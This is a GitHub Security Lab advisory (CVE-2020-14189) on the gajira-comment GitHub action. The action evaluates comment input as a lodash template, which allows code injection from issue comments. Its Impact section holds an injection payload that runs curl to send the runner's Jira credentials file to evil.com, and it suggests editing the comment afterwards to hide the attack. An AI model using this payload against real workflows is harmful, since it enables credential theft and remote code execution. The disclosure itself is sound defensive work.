<header class="post-header d-block mb-6">
      <div class="date text-mono f5 my-3">December 3, 2020</div>
      <h1 class="my-2 h00-mktg lh-condensed">GHSL-2020-173: Undocumented template expression evaluation in the gajira-comment GitHub action - CVE-2020-14189</h1>

      
      
      
      
      

      

      <a target="_blank" class="sc-frDJqD SgxRc d-inline-flex flex-row flex-items-center text-gray" href="https://github.com/jarlob">
        <img class="mr-3" src="https://avatars.githubusercontent.com/u/26652396?s=35" height="35" width="35">
        <span>Jaroslav Lobacevski</span>
      </a>
    </header>

    <main id="content" class="markdown-body" aria-label="Content">
      <h2 id="summary">Summary</h2>

<p>The <a href="https://github.com/atlassian/gajira-comment">gajira-comment GitHub action</a> isupports undocumented template syntax that may lead to arbitrary code execution.</p>

<h2 id="product">Product</h2>

<p><a href="https://github.com/atlassian/gajira-comment">gajira-comment GitHub action</a>.</p>

<h2 id="tested-version">Tested Version</h2>

<p>2.0.1</p>

<h2 id="details">Details</h2>

<h3 id="issue-the-potentially-untrusted-input-value-comment-is-evaluated-as-code-by-nodejs">Issue: The potentially untrusted input value <code class="language-plaintext highlighter-rouge">comment</code> is evaluated as code by node.js</h3>

<p>The action supports additional template transformation of the <code class="language-plaintext highlighter-rouge">comment</code> input value - all placeholders between double braces like <code class="language-plaintext highlighter-rouge">{{event.issue.body}}</code> are replaced with the according values from <code class="language-plaintext highlighter-rouge">github.event</code> context. The intention most probably was to use it like:</p>
<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="na">uses</span><span class="pi">:</span> <span class="s">atlassian/gajira-comment@v2.0.1</span>
<span class="na">with</span><span class="pi">:</span>
    <span class="na">comment</span><span class="pi">:</span> <span class="pi">|</span>
    <span class="s">Comment created by {{ event.comment.user.login }}</span>
    <span class="s">{{ event.comment.body }}</span>
</code></pre></div></div>

<p>i.e. without the dollar sign and the root <code class="language-plaintext highlighter-rouge">github</code> context object.</p>

<p>However this feature is not documented and the built-in GitHub context expressions are used by the users of the action instead, like:</p>

<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="na">uses</span><span class="pi">:</span> <span class="s">atlassian/gajira-comment@v2.0.1</span>
<span class="na">with</span><span class="pi">:</span>
    <span class="na">comment</span><span class="pi">:</span> <span class="pi">|</span>
    <span class="s">${{ github.event.comment.body }}</span>
</code></pre></div></div>

<p>This may lead to a double template evaluation if the user input contains <code class="language-plaintext highlighter-rouge">{{}}</code> itself. A <a href="https://github.com/atlassian/gajira-create/issues/8">public issue</a> in a similar action was created by one of the action users that proves it does happen.</p>

<p>The internal template feature is implemented in a way that the user input is interpreted as javascript:</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">const</span> <span class="nx">_</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">lodash</span><span class="dl">'</span><span class="p">)</span>

<span class="kd">const</span> <span class="nx">rawComment</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="nx">argv</span><span class="p">.</span><span class="nx">comment</span>

<span class="nx">_</span><span class="p">.</span><span class="nx">templateSettings</span><span class="p">.</span><span class="nx">interpolate</span> <span class="o">=</span> <span class="sr">/{{</span><span class="se">([\s\S]</span><span class="sr">+</span><span class="se">?)</span><span class="sr">}}/g</span>
<span class="kd">const</span> <span class="nx">compiled</span> <span class="o">=</span> <span class="nx">_</span><span class="p">.</span><span class="nx">template</span><span class="p">(</span><span class="nx">rawComment</span><span class="p">)</span>
<span class="kd">const</span> <span class="nx">interpolatedComment</span> <span class="o">=</span> <span class="nx">compiled</span><span class="p">({</span> <span class="na">event</span><span class="p">:</span> <span class="k">this</span><span class="p">.</span><span class="nx">githubEvent</span> <span class="p">})</span>
</code></pre></div></div>

<h4 id="impact">Impact</h4>

<p>This vulnerability allows for arbitrary code execution in the context of a GitHub runner. For example a user may create a comment with the body</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{{</span> <span class="nx">process</span><span class="p">.</span><span class="nx">mainModule</span><span class="p">.</span><span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">child_process</span><span class="dl">'</span><span class="p">).</span><span class="nx">exec</span><span class="p">(</span><span class="s2">`curl -d @</span><span class="p">${</span><span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">HOME</span><span class="p">}</span><span class="s2">/.jira.d/credentials http://evil.com`</span><span class="p">)</span> <span class="p">}}</span>
</code></pre></div></div>

<p>which will exfiltrate the secret Jira API token to the attacker controlled server. To make the attack less visible an attacker may modify the body of the comment to <code class="language-plaintext highlighter-rouge">Never mind my bad.</code> and close it.</p>

<h2 id="cve">CVE</h2>

<p>CVE-2020-14189</p>

<h2 id="coordinated-disclosure-timeline">Coordinated Disclosure Timeline</h2>

<ul>
  <li>10/14/2020: Report sent to vendor</li>
  <li>10/14/2020: Vendor acknowledges report receipt</li>
  <li>10/21/2020: Issue fixed in v2.0.2</li>
</ul>

<h2 id="credit">Credit</h2>

<p>This issue was discovered and reported by GHSL team member <a href="https://github.com/JarLob">@JarLob (Jaroslav Lobačevski)</a>.</p>

<h2 id="contact">Contact</h2>

<p>You can contact the GHSL team at <code class="language-plaintext highlighter-rouge">securitylab@github.com</code>, please include a reference to <code class="language-plaintext highlighter-rouge">GHSL-2020-173</code> in any communication regarding this issue.</p>

   